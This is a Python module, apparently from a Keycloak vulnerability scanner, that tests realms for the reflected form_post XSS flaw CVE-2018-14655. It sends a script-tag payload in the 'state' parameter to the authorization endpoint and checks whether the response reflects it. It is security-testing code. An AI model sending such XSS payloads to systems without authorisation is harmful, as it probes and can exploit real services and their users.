from typing import Set

from keycloak_scanner.logging.vuln_flag import VulnFlag
from keycloak_scanner.scan_base.scanner import Scanner
from keycloak_scanner.scan_base.types import FormPostXSS, WellKnown, Client, Realm
from keycloak_scanner.scan_base.wrap import WrapperTypes


class FormPostXssScanner(Scanner[FormPostXSS]):

    def __init__(self, **kwars):
        super().__init__(result_type=WrapperTypes.FORM_POST_XSS,
                         needs=[WrapperTypes.REALM_TYPE, WrapperTypes.CLIENT_TYPE, WrapperTypes.WELL_KNOWN_TYPE], **kwars)

    def perform(self, realm: Realm, client: Client, well_known: WellKnown, **kwargs) -> (Set[FormPostXSS], VulnFlag):

        results = set()

        vf = VulnFlag()

        if 'form_post' not in well_known.json['response_modes_supported']:

            super().verbose(f'post_form not in supported response types, can\' test CVE-2018-14655 for realm {realm}')

        else:

            url = well_known.json['authorization_endpoint']

            payload = 'af0ifjsldkj"/><script type="text/javascript">alert(1)</script> <p class="'
            r = super().session().get(url, params={
                    'state': payload,
                    'response_type': 'token',
                    'response_mode': 'form_post',
                    'client_id': client.name,
                    'nonce': 'csa3hMlvybERqcieLH'
                 })

            if r.status_code == 200:

                if payload in r.text:

                    super().find(f'XSS-CVE2018-14655', f'Vulnerable to CVE 2018 14655 realm:{realm.name}, client:{client.name}')

                    vf.set_vuln()
                    results.add(FormPostXSS(realm))

        return results, vf
